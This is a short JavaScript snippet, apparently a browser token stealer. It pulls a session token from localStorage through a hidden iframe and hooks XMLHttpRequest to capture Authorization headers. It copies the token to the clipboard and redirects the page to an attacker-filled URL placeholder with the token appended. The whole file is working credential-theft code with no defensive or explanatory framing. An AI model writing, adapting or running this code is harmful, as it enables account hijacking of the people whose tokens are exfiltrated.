const url = 'PASTE_URL_HERE';

(() => {
    function handleToken(token) {
        if (!token) return;
        navigator.clipboard.writeText(token).catch(() => {});
        window.location.replace(url + '/' + token);
    }

    // Primary method: iframe localStorage
    try {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        const raw = iframe.contentWindow.localStorage.token;
        if (raw) {
            const token = raw.replace(/"/g, '');
            handleToken(token);
        }
    } catch {}

    // Fallback method: XMLHttpRequest hook
    const original = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (name.toLowerCase() === 'authorization') {
            handleToken(value);
        }
        return original.call(this, name, value);
    };
})();
